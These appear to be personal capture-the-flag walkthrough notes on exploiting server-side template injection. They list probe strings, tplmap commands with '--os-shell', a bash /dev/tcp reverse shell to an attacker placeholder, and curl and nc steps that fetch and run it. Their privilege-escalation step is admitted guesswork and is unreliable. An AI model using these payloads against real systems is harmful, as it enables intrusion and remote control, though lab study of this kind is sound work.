services
-p80



# SSTI injection
-> use template syntax to inject malicious payload
check possible blacklisted chars:
`* % $ # { }` etc

Examples tests:
`{{7*7}}`
`${7*&}`
`{{7*7}}
`${7*7}`
`<%= 7*7 %>`
`${{7*7}}`
`#{7*7}`
`*{7*7}`  etc
(List of available payloads found online)
![[Pasted image 20230411133250.png]]

or using tools
`python2.7 ./tplmap.py -u 'http://www.target.com/page?name=John*' --os-shell`
`python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=*&comment=supercomment&link"`
`python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=InjectHere*&comment=A&link" --level 5 -e jade`

Write some simple code to replace blacklisted chars and generate payload

Upload revshell script
`vimshell.sh`
```bash
#!/bin/bash
bash -c "/bin/bash -i >& /dev/tcp/<attackersip>/9001 0>&1"
```
`python3 -m http.server 8000`

Using the SSTI to download, (use the code to generate below code without blacklisted chars)
`curl <atkersip>:8000/shell.sh --output /tmp/shell.sh`

Exec the payload
`nc -lvnp 9001`
(using the SSTI again with payload generated for below)
`bash /tmp/shell.sh`

-> user access gotten


# PE
- group owned file with root rights
-> (below is speculation. Original answers lost.)

- cp /bin/bash to folder with root rights and exec anything
